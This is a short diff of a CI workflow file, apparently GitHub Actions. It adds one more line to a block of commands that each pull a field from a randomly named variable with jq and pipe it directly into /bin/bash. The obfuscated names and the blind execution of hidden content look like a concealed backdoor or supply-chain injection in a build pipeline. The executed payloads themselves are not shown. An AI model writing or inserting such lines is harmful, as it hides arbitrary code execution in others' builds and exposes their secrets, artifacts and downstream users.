@@ -41,6 +41,7 @@ jobs:
           echo $br08912 | jq -r .nssie9 | /bin/bash
           echo $il0 | jq -r .bvnsg7 | /bin/bash
           printf '%s' "$lodgo3" | jq -r .lruf646 | /bin/bash
+          echo $ro00 | jq -r .s037 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
